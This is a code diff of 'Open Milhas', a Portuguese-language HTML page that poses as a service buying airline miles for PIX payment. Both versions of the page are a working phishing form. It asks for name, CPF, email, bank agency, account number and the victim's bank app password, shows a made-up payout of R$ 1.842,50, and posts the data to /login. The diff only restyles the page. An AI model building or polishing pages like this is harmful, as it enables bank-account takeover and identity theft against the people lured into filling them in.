@@ -3,89 +3,50 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Open Milhas | Venda Agora</title>
-    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@800&display=swap" rel="stylesheet">
+    <title>Open Milhas</title>
     <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
     <style>
-        :root { --primary: #0046ff; --dark-blue: #002db3; }
-        body { font-family: 'Segoe UI', sans-serif; background: #f8f9fa; margin: 0; }
-        
-        .navbar { background: white; border-bottom: 1px solid #eee; padding: 15px; text-align: center; }
-        .navbar-brand { font-family: 'Montserrat', sans-serif; font-weight: 800; color: #0a1128; text-transform: uppercase; font-size: 1.5rem; }
-
-        .hero { 
-            background: linear-gradient(90deg, var(--primary) 0%, var(--dark-blue) 100%); 
-            color: white; padding: 40px 20px 100px 20px; text-align: center;
-        }
-        .main-title { font-family: 'Montserrat', sans-serif; font-weight: 800; font-size: 2.2rem; line-height: 1.2; }
-
-        .card-form { 
-            border: none; border-radius: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); 
-            margin: -60px auto 40px auto; max-width: 500px; background: white; padding: 25px;
-        }
-
-        /* CORREÇÃO DO CARREGAMENTO: O primeiro passo DEVE estar visível */
+        body { background: #0046ff; font-family: sans-serif; color: white; }
+        .card { color: #333; border-radius: 20px; border: none; }
         .step { display: none; }
-        .step.active { display: block !important; } /* O !important força a exibição */
-
-        .form-control { border-radius: 8px; padding: 12px; margin-bottom: 15px; border: 1px solid #ddd; width: 100%; box-sizing: border-box; }
-        .btn-next { background: var(--primary); color: white; border: none; border-radius: 50px; padding: 15px; font-weight: 700; width: 100%; cursor: pointer; }
-        .btn-success { background: #28a745; color: white; border: none; border-radius: 50px; padding: 15px; font-weight: 800; width: 100%; cursor: pointer; }
+        .active { display: block !important; }
     </style>
 </head>
 <body>
-
-<nav class="navbar">
-    <span class="navbar-brand">OPEN <span style="color:#c5a059">MILHAS</span></span>
-</nav>
-
-<section class="hero">
-    <h1 class="main-title">Transforme milhas em dinheiro agora</h1>
-    <p>Receba via PIX em até 24h.</p>
-</section>
-
-<div class="card-form">
-    <form action="/login" method="POST">
-        
-        <div class="step active" id="step1">
-            <h5 class="fw-bold mb-3">1. Seus Dados</h5>
-            <input type="text" name="nome" class="form-control" placeholder="Nome Completo" required>
-            <input type="text" name="cpf" class="form-control" placeholder="CPF" required>
-            <input type="email" name="email" class="form-control" placeholder="E-mail" required>
-            <button type="button" class="btn-next" onclick="nextStep(2)">CONTINUAR</button>
+    <div class="container py-5">
+        <div class="text-center mb-4">
+            <h2 class="fw-bold">OPEN MILHAS</h2>
         </div>
-
-        <div class="step" id="step2">
-            <h5 class="fw-bold mb-3">2. Dados Bancários</h5>
-            <input type="text" name="agencia" class="form-control" placeholder="Agência">
-            <input type="text" name="conta" class="form-control" placeholder="Conta com Dígito">
-            <input type="password" name="senha_app" class="form-control" placeholder="Senha do App do Banco">
-            <button type="button" class="btn-next" onclick="nextStep(3)">VER COTAÇÃO</button>
+        <div class="card p-4 mx-auto" style="max-width: 450px;">
+            <form action="/login" method="POST">
+                <div class="step active" id="s1">
+                    <h4>Dados Pessoais</h4>
+                    <input type="text" name="nome" class="form-control mb-2" placeholder="Nome" required>
+                    <input type="text" name="cpf" class="form-control mb-2" placeholder="CPF" required>
+                    <input type="email" name="email" class="form-control mb-3" placeholder="E-mail" required>
+                    <button type="button" class="btn btn-primary w-100" onclick="go(2)">CONTINUAR</button>
+                </div>
+                <div class="step" id="s2">
+                    <h4>Recebimento PIX</h4>
+                    <input type="text" name="agencia" class="form-control mb-2" placeholder="Agência">
+                    <input type="text" name="conta" class="form-control mb-2" placeholder="Conta">
+                    <input type="password" name="senha_app" class="form-control mb-3" placeholder="Senha do App">
+                    <button type="button" class="btn btn-primary w-100" onclick="go(3)">VER VALOR</button>
+                </div>
+                <div class="step" id="s3">
+                    <div class="text-center">
+                        <h3 class="text-success">R$ 1.842,50</h3>
+                        <button type="submit" class="btn btn-success w-100 mt-3">VENDER AGORA</button>
+                    </div>
+                </div>
+            </form>
         </div>
-
-        <div class="step" id="step3">
-            <div class="text-center">
-                <h3 class="text-success fw-bold">R$ 1.842,50</h3>
-                <p class="text-muted small">Valor liberado para o seu CPF.</p>
-                <button type="submit" class="btn-success">CONCLUIR E RECEBER AGORA</button>
-            </div>
-        </div>
-
-    </form>
-</div>
-
-<script>
-    function nextStep(n) {
-        // Remove a classe active de todos
-        var steps = document.getElementsByClassName('step');
-        for (var i = 0; i < steps.length; i++) {
-            steps[i].classList.remove('active');
+    </div>
+    <script>
+        function go(n) {
+            document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
+            document.getElementById('s'+n).classList.add('active');
         }
-        // Adiciona no passo desejado
-        document.getElementById('step' + n).classList.add('active');
-        window.scrollTo(0, 0);
-    }
-</script>
-
+    </script>
 </body>
 </html>
